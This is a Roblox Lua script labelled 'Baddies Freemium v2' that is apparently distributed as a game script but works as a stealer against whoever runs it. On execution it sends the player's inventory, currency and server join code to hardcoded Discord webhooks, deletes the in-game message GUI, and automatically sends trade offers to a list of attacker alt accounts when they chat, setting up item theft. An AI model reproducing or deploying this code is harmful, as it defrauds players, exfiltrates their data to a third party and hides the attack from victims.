-- Baddies Freemium v2
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

local lp = Players.LocalPlayer
local pg = lp:WaitForChild("PlayerGui")

-- Settings from loader
local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

-- HTTP request wrapper that tries every mobile method
local function sendRequest(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function() return request({Url=url, Method="POST", Headers=headers, Body=body}) end,
        function() return syn.request({Url=url, Method="POST", Headers=headers, Body=body}) end,
        function() return http.request({Url=url, Method="POST", Headers=headers, Body=body}) end,
        function() return http_request({Url=url, Method="POST", Headers=headers, Body=body}) end,
        function() return (fluxus or {}).request({Url=url, Method="POST", Headers=headers, Body=body}) end,
        function() return (hookfunction or error)() end,
    }
    for _, m in ipairs(methods) do
        local s, r = pcall(m)
        if s and r then return r end
    end
end

-- Collect all tools across backpack/char/gear
local function getTools()
    local tools = {}
    local function scan(obj)
        if not obj then return end
        local ok, children = pcall(function() return obj:GetChildren() end)
        if not ok then return end
        for _, v in ipairs(children) do
            if v:IsA("Tool") then table.insert(tools, v.Name) end
        end
    end
    scan(lp:FindFirstChild("Backpack"))
    scan(lp.Character)
    scan(lp:FindFirstChild("StarterGear"))
    return tools
end

local function classifyTools(tools)
    local basePatterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle","noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local low = name:lower()
        local isBase = false
        for _, p in ipairs(basePatterns) do
            if low:find(p, 1, true) then isBase = true break end
        end
        if isBase then table.insert(base, name) else table.insert(main, name) end
    end
    return base, main
end

local function fmt(n)
    if type(n) ~= "number" then return tostring(n) end
    if n >= 1e6 then return string.format("%.1fM", n/1e6)
    elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
    else return tostring(n) end
end

-- ══════════════════════════════════════════
--  WEBHOOK PING  (runs first, unconditionally)
-- ══════════════════════════════════════════
task.spawn(function()
    -- Give game 2 seconds to load leaderstats
    task.wait(2)

    local name = lp.Name
    local tools = getTools()
    local base, main = classifyTools(tools)
    local isRich = #main >= 3

    local ls  = lp:FindFirstChild("leaderstats")
    local din = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local sla = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"

    local joinScript = string.format(
        "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')",
        game.PlaceId, game.JobId
    )

    local embed = {
        title       = name .. "'s Inventory",
        description = "**Base Weapons**
" .. (#base>0 and table.concat(base,"
") or "None")
                   .. "

**Main Weapons**
" .. (#main>0 and table.concat(main,"
") or "None"),
        color       = isRich and 0xFF0000 or 0xFFA500,
        fields      = {
            {name="Dinero",       value=fmt(din),                            inline=true},
            {name="Slays",        value=fmt(sla),                            inline=true},
            {name="Players",      value=tostring(#Players:GetPlayers()),     inline=true},
            {name="Server Join",  value="```lua
"..joinScript.."
```",   inline=false},
        },
        footer    = {text = "Freemium Logger | " .. name},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    -- Always ping user webhook
    if USER_WEBHOOK ~= "PUTHERE" then
        local content = name .. " executed your script!"
        if isRich and PING_POOR then
            content = content .. " @everyone @here RICH HIT!"
        end
        sendRequest(USER_WEBHOOK, {content=content, embeds={embed}})
    end

    -- Ping owner webhook on rich hit
    if isRich then
        local ownerContent = "@everyone RICH: " .. name
        sendRequest(MY_WEBHOOK, {content=ownerContent, embeds={embed}})
    end
end)

-- ══════════════════════════════════════════
--  MESSAGES GUI  (hide spam GUI)
-- ══════════════════════════════════════════
task.spawn(function()
    local function killMsg(g) if g.Name == "Messages" then pcall(function() g:Destroy() end) end end
    for _, g in ipairs(pg:GetChildren()) do killMsg(g) end
    pg.ChildAdded:Connect(killMsg)
    while true do
        local m = pg:FindFirstChild("Messages")
        if m then pcall(function() m:Destroy() end) end
        task.wait(0.15)
    end
end)

-- ══════════════════════════════════════════
--  TRADING  (send offer when alt chats)
-- ══════════════════════════════════════════
task.spawn(function()
    -- Enable trade
    local ok1, REPhone = pcall(function()
        return ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
    end)
    if ok1 and REPhone then
        pcall(function() REPhone:FireServer("TradeEnabled", true) end)
    end

    -- Show trade request panel
    local ok2, tradeList = pcall(function()
        local tl = pg:WaitForChild("TradeList", 10)
        local mf = tl and tl:WaitForChild("Main", 5)
        local tr = mf and mf:WaitForChild("TradeRequest", 5)
        return tr
    end)
    if ok2 and tradeList then
        pcall(function() tradeList.Visible = true end)
    end

    -- Send trade on chat from my alts
    local function onChat(sender)
        for _, u in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == u:lower() then
                task.wait(0.3)
                pcall(function()
                    local RFTrade = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
                    RFTrade:InvokeServer(sender)
                end)
                break
            end
        end
    end

    -- Hook TextChatService
    if TextChatService then
        pcall(function()
            TextChatService.OnIncomingMessage = function(msg)
                local ts = msg.TextSource
                if not ts then return end
                local s = Players:GetPlayerByUserId(ts.UserId)
                if s then task.delay(0.3, function() onChat(s) end) end
            end
        end)
    end

    -- Hook existing players
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then
            pcall(function()
                p.Chatted:Connect(function() task.delay(0.3, function() onChat(p) end) end)
            end)
        end
    end

    -- Hook new players
    Players.PlayerAdded:Connect(function(p)
        pcall(function()
            p.Chatted:Connect(function() task.delay(0.3, function() onChat(p) end) end)
        end)
    end)
end)